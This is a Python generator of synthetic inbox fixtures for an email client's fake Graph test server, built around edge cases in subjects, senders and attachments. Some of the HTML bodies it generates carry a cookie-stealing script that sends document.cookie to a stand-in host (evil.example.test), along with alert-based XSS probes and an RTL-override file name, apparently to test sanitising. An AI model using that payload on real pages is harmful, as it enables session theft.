#!/usr/bin/env python3
"""Deterministic mailbox fixture generator for the Slow Mail fake Graph server.

Standard library only.  Same (count, seed, now) always yields byte-identical output.

    python3 tools/fake_graph/generate_fixture.py --count 1000 --seed 42 \
        --out tests/contract/fixtures/inbox_1000.json
    python3 tools/fake_graph/generate_fixture.py --small \
        --out tests/contract/fixtures/inbox_small.json

Fixture format: see tools/fake_graph/README.md ("Fixture format").
"""
from __future__ import annotations

import argparse
import datetime as dt
import json
import random
import sys
from typing import Any, Dict, List, Optional

FORMAT = "slowmail-fake-graph-fixture/1"
DEFAULT_NOW = "2026-10-20T12:00:00Z"
USER_ADDRESS = "slowmail.test@example.test"

FIRST = ["Alice", "Bob", "Chandra", "Dmitri", "Elena", "Farid", "Grace", "Hiro", "Ines", "Jamal",
         "Kofi", "Lena", "Mateo", "Noor", "Olga", "Priya", "Quinn", "Rosa", "Sven", "Tariq"]
LAST = ["Andersen", "Banerjee", "Costa", "Dubois", "Eriksson", "Fischer", "Garcia", "Haddad",
        "Ivanov", "Jensen", "Kim", "Lopez", "Mori", "Novak", "Okafor", "Petrov"]
DOMAINS = ["example.test", "corp.example.test", "mail.example.test", "news.example.test"]
SUBJECTS = [
    "Weekly status update", "Invoice {n} attached", "Meeting moved to Thursday", "Re: budget review",
    "Quarterly planning notes", "Your order has shipped", "Action required: password policy",
    "Lunch on Friday?", "Draft agenda for offsite", "FW: customer escalation", "Release checklist",
    "Travel itinerary", "Security digest", "Can you review this?", "Thanks!", "Minutes from yesterday",
]
EMOJI = ["\U0001F4EC", "\U0001F525", "✅", "\U0001F680", "\U0001F389", "⚠️", "\U0001F468‍\U0001F469‍\U0001F467"]
RTL = ["مرحبا بالعالم", "שלום עולם"]
CJK = ["你好世界", "こんにちは世界", "안녕하세요"]
ZALGO = "Z̷̢͓a̸l̶g̵o̷"

MIME_PDF = "application/pdf"
MIME_DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
MIME_PNG = "image/png"
CONTENT_BYTES = "JVBERi0xLjQKJSVFT0YK"  # tiny placeholder; real Graph would send the file


def _iso(epoch: int) -> str:
    return dt.datetime.fromtimestamp(epoch, dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _epoch(iso: str) -> int:
    return int(dt.datetime.strptime(iso, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=dt.timezone.utc).timestamp())


def _sender(rng: random.Random) -> Dict[str, Any]:
    first, last = rng.choice(FIRST), rng.choice(LAST)
    addr = f"{first}.{last}@{rng.choice(DOMAINS)}".lower()
    return {"emailAddress": {"name": f"{first} {last}", "address": addr}}


def long_unicode_subject(rng: random.Random, min_len: int = 400) -> str:
    parts: List[str] = []
    total = 0
    while total < min_len:
        piece = rng.choice([
            rng.choice(EMOJI), rng.choice(RTL), rng.choice(CJK), ZALGO,
            rng.choice(SUBJECTS), "very-long-unbroken-token-" + "x" * rng.randint(20, 60),
        ])
        parts.append(piece)
        total += len(piece) + 1
    return " ".join(parts)


def odd_control_subject(rng: random.Random) -> str:
    return rng.choice([
        "Bell\u0007 and\ttab",
        "Line one\nLine two\r\nLine three",
        "Right-to-left override ‮evil.exe‬ here",
        "Zero​width​spaces",
    ])


def _text_body(rng: random.Random, i: int) -> str:
    who = rng.choice(FIRST)
    lines = [f"Hi,", "", f"This is message {i}. " + rng.choice([
        "Please find the update below.", "Could you take a look when you have a minute?",
        "Reminder about the deadline.", "No action needed."]),
        "", "- item one", "- item two", "", "Thanks,", who]
    if rng.random() < 0.15:  # nested plain-text quoting
        lines += ["", f"On Mon, {rng.choice(FIRST)} wrote:", "> first level", "> > second level",
                  "> > > third level with a long long line " + "word " * 20]
    return "\n".join(lines)


def _html_body(rng: random.Random, i: int) -> str:
    inner = [f"<p>Hello,</p><p>Message {i}: {rng.choice(['Quarterly numbers', 'Team lunch', 'Build results'])} &amp; more &lt;details&gt;.</p>"]
    r = rng.random()
    if r < 0.25:
        inner.append("<script>document.location='https://evil.example.test/?c='+document.cookie</script>"
                     "<p>Click <a href=\"javascript:alert(1)\">here</a>.</p>")
    if 0.15 < r < 0.55:
        inner.append(f"<img src=\"https://track.example.test/o.gif?m={i}\" width=\"1\" height=\"1\" alt=\"\">")
    if 0.5 < r < 0.7:
        inner.append("<style>@import url(https://fonts.example.test/x.css);</style>"
                     "<link rel=\"stylesheet\" href=\"https://cdn.example.test/a.css\">")
    if rng.random() < 0.25:  # nested quotes
        inner.append("<div>Reply text</div><blockquote>level 1<blockquote>level 2<blockquote>level 3 "
                     + "quoted " * 15 + "</blockquote></blockquote></blockquote>")
    return "<html><head><title>t</title></head><body>" + "".join(inner) + "</body></html>"


def _file_att(i: int, k: int, name: str, mime: str, size: int, inline: bool = False) -> Dict[str, Any]:
    att: Dict[str, Any] = {"@odata.type": "#microsoft.graph.fileAttachment", "id": f"att-{i:06d}-{k}",
                           "name": name, "contentType": mime, "size": size, "isInline": inline,
                           "contentBytes": CONTENT_BYTES}
    if inline:
        att["contentId"] = f"cid-{i}-{k}@example.test"
    return att


def _item_att(i: int, k: int) -> Dict[str, Any]:
    return {"@odata.type": "#microsoft.graph.itemAttachment", "id": f"att-{i:06d}-{k}", "name": "Re: budget review",
            "contentType": None, "size": 2411, "isInline": False}


def _ref_att(i: int, k: int) -> Dict[str, Any]:
    return {"@odata.type": "#microsoft.graph.referenceAttachment", "id": f"att-{i:06d}-{k}", "name": "plan.docx",
            "contentType": None, "size": 745, "isInline": False}


def attachment_template(t: int, i: int, rng: random.Random) -> List[Dict[str, Any]]:
    sz = lambda: rng.randint(2_000, 5_000_000)  # noqa: E731
    templates = [
        lambda: [_file_att(i, 0, "report.pdf", MIME_PDF, sz())],
        lambda: [_file_att(i, 0, "minutes.docx", MIME_DOCX, sz())],
        lambda: [_file_att(i, 0, "photo.png", MIME_PNG, sz())],
        lambda: [_file_att(i, 0, "report.pdf", MIME_PDF, sz()), _file_att(i, 1, "minutes.docx", MIME_DOCX, sz()),
                 _file_att(i, 2, "photo.png", MIME_PNG, sz())],
        lambda: [_file_att(i, 0, "logo.png", MIME_PNG, 4_321, inline=True),
                 _file_att(i, 1, "contract.pdf", MIME_PDF, sz())],
        lambda: [_item_att(i, 0)],
        lambda: [_ref_att(i, 0)],
        lambda: [_file_att(i, 0, "banner.png", MIME_PNG, 9_999, inline=True)],  # inline only
        lambda: [_item_att(i, 0), _ref_att(i, 1), _file_att(i, 2, "sig.png", MIME_PNG, 1_024, inline=True)],
    ]
    return templates[t % len(templates)]()


def generate(count: int, seed: int, now: str = DEFAULT_NOW, days: int = 90, id_tag: str = "") -> Dict[str, Any]:
    """Return a fixture dict with `count` inbox messages."""
    rng = random.Random(seed)
    now_epoch = _epoch(now)
    n_flag = count // 10
    n_att = count // 5
    flagged = set(rng.sample(range(count), n_flag)) if count else set()
    attach_order = rng.sample(range(count), n_att) if count else []
    att_rank = {idx: k for k, idx in enumerate(attach_order)}
    perm = rng.sample(range(count), count) if count else []

    def slice_set(start: int, n: int) -> set:
        return set(perm[start:start + n])

    floor = (lambda frac: max(1, int(count * frac))) if count >= 12 else (lambda frac: 0)
    n_long, n_empty, n_ctrl = floor(0.04), floor(0.02), floor(0.01)
    n_noaddr, n_nofrom = floor(0.02), floor(0.01)
    pos = 0
    long_set = slice_set(pos, n_long); pos += n_long
    empty_set = slice_set(pos, n_empty); pos += n_empty
    ctrl_set = slice_set(pos, n_ctrl); pos += n_ctrl
    noaddr_set = slice_set(pos, n_noaddr); pos += n_noaddr
    nofrom_set = slice_set(pos, n_nofrom); pos += n_nofrom

    convs: List[str] = []
    messages: List[Dict[str, Any]] = []
    for i in range(count):
        received = _iso(now_epoch - int(rng.random() * days * 86400))
        if i in empty_set:
            subject = ""
        else:
            if i in long_set:
                base = long_unicode_subject(rng)
            elif i in ctrl_set:
                base = odd_control_subject(rng)
            else:
                base = rng.choice(SUBJECTS).format(n=rng.randint(1000, 9999))
                if rng.random() < 0.1:
                    base += " " + rng.choice(EMOJI)
            subject = f"[{i:04d}] {base}"
        if convs and rng.random() < 0.3:
            conv = rng.choice(convs)
        else:
            conv = f"AAQkAGEN{seed:04x}{i:06d}="
            convs.append(conv)
        is_html = rng.random() < 0.6
        if is_html:
            body = {"contentType": "html", "content": _html_body(rng, i)}
        else:
            body = {"contentType": "text", "content": _text_body(rng, i)}
        if rng.random() < 0.01:  # a few large bodies
            body["content"] += ("\n" if not is_html else "<p>") + "Long paragraph. " * 1800
        msg: Dict[str, Any] = {
            "id": f"AAMkAGEN{id_tag}{seed:04x}{i:06d}AAA=",
            "folder": "inbox",
            "conversationId": conv,
            "internetMessageId": f"<{rng.getrandbits(64):016x}@mail.example.test>",
            "receivedDateTime": received,
            "sentDateTime": received,
            "subject": subject,
            "importance": "high" if rng.random() < 0.05 else "normal",
            "isRead": rng.random() < 0.6,
            "flag": {"flagStatus": "flagged" if i in flagged else "notFlagged"},
            "body": body,
            "toRecipients": [{"emailAddress": {"name": "Slow Mail Test", "address": USER_ADDRESS}}],
        }
        if i in noaddr_set:
            msg["from"] = {"emailAddress": {"name": "No Address Sender"}}
        elif i not in nofrom_set:
            msg["from"] = _sender(rng)
        if i in att_rank:
            k = att_rank[i]
            atts = attachment_template(k, i, rng)
            if k == 0:  # 10 000-char name
                atts.append(_file_att(i, 9, "A" * 10_000 + ".pdf", MIME_PDF, 1234))
            elif k == 1:  # unknown size
                atts.append(_file_att(i, 9, "unknown-size.bin", "application/octet-stream", -1))
            msg["attachments"] = atts
        messages.append(msg)
    return {"format": FORMAT, "generator": {"count": count, "seed": seed, "now": now},
            "messages": messages}


def small_fixture() -> Dict[str, Any]:
    """Twelve hand-readable messages, one per interesting case."""
    now = _epoch(DEFAULT_NOW)
    rng = random.Random(7)

    def when(hours: float) -> str:
        return _iso(now - int(hours * 3600))

    sender = lambda n, a: {"emailAddress": {"name": n, "address": a}}  # noqa: E731
    msgs: List[Dict[str, Any]] = [
        {"id": "small-01-plain-text", "subject": "Plain text hello", "from": sender("Alice Andersen", "alice@example.test"),
         "receivedDateTime": when(1), "isRead": False,
         "body": {"contentType": "text", "content": "Hi,\n\nJust a plain text message.\n\nAlice"}},
        {"id": "small-02-html-script-tracker", "subject": "Newsletter with script and tracker (A11)",
         "from": sender("News Bot", "news@news.example.test"), "receivedDateTime": when(2),
         "body": {"contentType": "html", "content":
                  "<html><body><h1>Big news</h1><p>Read &amp; enjoy.</p>"
                  "<script>alert('xss')</script>"
                  "<img src=\"https://track.example.test/pixel.gif?u=1\" width=\"1\" height=\"1\">"
                  "<link rel=\"stylesheet\" href=\"https://cdn.example.test/a.css\"></body></html>"}},
        {"id": "small-03-flagged-externally", "subject": "Already flagged in Outlook", "from": sender("Bob Banerjee", "bob@example.test"),
         "receivedDateTime": when(3), "flag": {"flagStatus": "flagged"}, "isRead": True,
         "body": {"contentType": "text", "content": "Flagged before Slow Mail ever saw it (Q6)."}},
        {"id": "small-04-empty-subject", "subject": "", "from": sender("Chandra Costa", "chandra@example.test"),
         "receivedDateTime": when(4), "body": {"contentType": "text", "content": "This message has an empty subject."}},
        {"id": "small-05-long-unicode-subject", "subject": "[05] " + long_unicode_subject(rng),
         "from": sender("Dmitri Dubois", "dmitri@example.test"), "receivedDateTime": when(5),
         "body": {"contentType": "text", "content": "Subject is 400+ characters of emoji, RTL, CJK and combining marks."}},
        {"id": "small-06-malformed-sender", "subject": "Sender has no address", "from": {"emailAddress": {"name": "Nameless Address"}},
         "receivedDateTime": when(6), "body": {"contentType": "text", "content": "emailAddress.address is missing."}},
        {"id": "small-07-pdf-docx-png", "subject": "Three file attachments (A17)", "from": sender("Elena Eriksson", "elena@example.test"),
         "receivedDateTime": when(7), "body": {"contentType": "text", "content": "See attached."},
         "attachments": [_file_att(7, 0, "report.pdf", MIME_PDF, 183421), _file_att(7, 1, "minutes.docx", MIME_DOCX, 52311),
                         _file_att(7, 2, "photo.png", MIME_PNG, 2048576)]},
        {"id": "small-08-inline-item-reference", "subject": "Inline image, item and reference attachments (A18)",
         "from": sender("Farid Fischer", "farid@example.test"), "receivedDateTime": when(8),
         "body": {"contentType": "html", "content": "<p>Logo: <img src=\"cid:cid-8-0@example.test\"></p>"},
         "attachments": [_file_att(8, 0, "logo.png", MIME_PNG, 4321, inline=True), _item_att(8, 1), _ref_att(8, 2)]},
        {"id": "small-09-attachment-extremes", "subject": "Huge name and size -1 (A19)", "from": sender("Grace Garcia", "grace@example.test"),
         "receivedDateTime": when(9), "body": {"contentType": "text", "content": "Malicious-looking attachment metadata."},
         "attachments": [_file_att(9, 0, "A" * 10000 + ".pdf", MIME_PDF, 1234),
                         _file_att(9, 1, "unknown-size.bin", "application/octet-stream", -1)]},
        {"id": "small-10-nested-quotes", "subject": "Re: Re: Re: nested quoting", "from": sender("Hiro Haddad", "hiro@example.test"),
         "receivedDateTime": when(10), "isRead": True,
         "body": {"contentType": "html", "content":
                  "<div>Sounds good.</div><blockquote>Can we meet?<blockquote>Earlier: agenda attached"
                  "<blockquote>Original: hello</blockquote></blockquote></blockquote>"}},
        {"id": "small-11-inline-only", "subject": "Only an inline image (hasAttachments=false)", "from": sender("Ines Ivanov", "ines@example.test"),
         "receivedDateTime": when(11), "body": {"contentType": "html", "content": "<p>Pic: <img src=\"cid:x\"></p>"},
         "attachments": [_file_att(11, 0, "banner.png", MIME_PNG, 9999, inline=True)]},
        {"id": "small-12-old-no-from", "subject": "Old unread mail with entities &amp; no from", "receivedDateTime": when(24 * 89),
         "isRead": False, "body": {"contentType": "html", "content": "<p>5 &lt; 6 &amp;&amp; 7 &gt; 3 &nbsp;&copy;</p>"}},
    ]
    for m in msgs:
        m.setdefault("folder", "inbox")
        m.setdefault("conversationId", "conv-" + m["id"])
    return {"format": FORMAT, "generator": {"small": True}, "messages": msgs}


def write_fixture(data: Dict[str, Any], path: str, pretty: bool = False) -> None:
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        if pretty:
            json.dump(data, fh, ensure_ascii=False, indent=2)
            fh.write("\n")
            return
        head = {k: v for k, v in data.items() if k != "messages"}
        fh.write("{" + ",".join(json.dumps(k) + ":" + json.dumps(v, ensure_ascii=False) for k, v in head.items()))
        fh.write(',"messages":[\n')
        fh.write(",\n".join(json.dumps(m, ensure_ascii=False, separators=(",", ":")) for m in data["messages"]))
        fh.write("\n]}\n")


def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--count", type=int, default=1000)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--now", default=DEFAULT_NOW, help="reference 'now' (ISO, Z) for the 90-day spread")
    ap.add_argument("--small", action="store_true", help="write the hand-readable 12-message fixture instead")
    ap.add_argument("--out", required=True)
    args = ap.parse_args(argv)
    if args.small:
        write_fixture(small_fixture(), args.out, pretty=True)
        print(f"wrote 12 messages to {args.out}")
    else:
        write_fixture(generate(args.count, args.seed, args.now), args.out)
        print(f"wrote {args.count} messages to {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
